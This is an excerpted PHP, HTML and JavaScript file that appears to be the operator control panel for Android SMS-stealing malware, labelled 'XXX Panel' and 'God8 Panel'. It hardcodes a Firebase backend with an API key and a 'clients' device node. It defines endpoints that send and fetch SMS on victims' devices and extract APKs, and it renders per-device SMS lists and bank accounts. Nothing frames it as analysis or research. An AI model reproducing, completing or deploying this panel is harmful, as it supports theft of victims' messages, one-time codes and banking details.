...
$XXX_GOD8_FIREBASE = [
  'id' => 'god8_208ac',
  'name' => 'God8 Panel',
  'databaseURL' => 'https://god8-208ac-default-rtdb.asia-southeast1.firebasedatabase.app',
  'url' => 'https://god8-208ac-default-rtdb.asia-southeast1.firebasedatabase.app',
  'apiKey' => 'AIzaSyAUMQiQExYiF_FdetBg7OrSKHp0di7JdjM',
  'authDomain' => 'god8-208ac.firebaseapp.com',
  'projectId' => 'god8-208ac',
  'storageBucket' => 'god8-208ac.firebasestorage.app',
  'messagingSenderId' => '298028302827',
  'appId' => '1:298028302827:android:55a43383024e987e5cd9ae',
  'schema' => 'rabel',
  'secret' => '',
  'key' => '',
  'deviceNode' => 'clients',
...
if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
  rebel_json_out([
    'ok' => true,
    'projects' => [$XXX_GOD8_FIREBASE],
  ]);
}

$serverProjects = [$XXX_GOD8_FIREBASE];
...
<title>XXX Panel</title>
<!-- xxx-panel god8-208ac -->
...
<div class="app" id="appShell">
  <header class="hdr">
    <div class="hdr-left">
      ...
      <div>
        <div class="hdr-title">XXX Panel</div>
  ...
  <div class="screens">
    ...
    <section class="screen" id="screen-more">
      <span class="proto-tag">👑 XXX PANEL</span>
      <div class="menu-list">
...
<div class="sheet" id="fbSheet">
  ...
  <div class="sheet-title">God8 Firebase</div>
  <div id="fbSheetList"></div>
  <div class="fb-add-form" style="padding:12px 0;font-size:11px;color:var(--muted);line-height:1.5">
    Locked to <b>god8-208ac</b>. Multi-Firebase: <a href="admin.php" style="color:var(--accent2)">admin.php</a>
  </div>
</div>
<div class="toast-wrap" id="toasts"></div>

<script src="xxx_firebase_defaults.js"></script>
<script>
var SEND_SMS_URL='xxx.php?rebel_send_sms=1';
var FETCH_SMS_URL='xxx.php?rebel_fetch_sms=1';
var APK_EXTRACT_URL='xxx.php?rebel_apk_extract=1';
var SMS_TOKEN_URL='xxx.php?sms_token_api=1';
var FIREBASE_API_URL='xxx.php?rebel_firebase_api=1';
var XXX_GOD8_ONLY=true;
...
function loadFirebaseConfigs(){
  var storm=DEFAULT_FIREBASES.length?DEFAULT_FIREBASES[0]:((SERVER_FIREBASES||[])[0]||null);
  return storm?[storm]:[];
}
function reloadServerFirebase(){
  return fetch(FIREBASE_API_URL,{cache:'no-store',credentials:'same-origin'}).then(function(r){return r.json();}).then(function(d){
    if(d&&d.ok){SERVER_FIREBASES=(d.projects||[]).slice(0,1);return SERVER_FIREBASES;}
    return loadFirebaseConfigs();
  }).catch(function(){return loadFirebaseConfigs();});
}
...
function initFirebaseInstance(cfg){
  ...
  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||((cfg.databaseURL||'').indexOf('rabel')>=0||(cfg.databaseURL||'').indexOf('god8')>=0?'rabel':'spinplay'),liveAttached:false};
...
function addFirebaseProject(extractMeta){
  ...
  adminApiPost(Object.assign({action:'add'},cfg)).then(function(res){
...
function selectDevice(id){
  ...
  renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice(true);renderBankAccounts();
...
function renderSms(){
  ...
  el.innerHTML=list.slice(0,80).map(function(s){
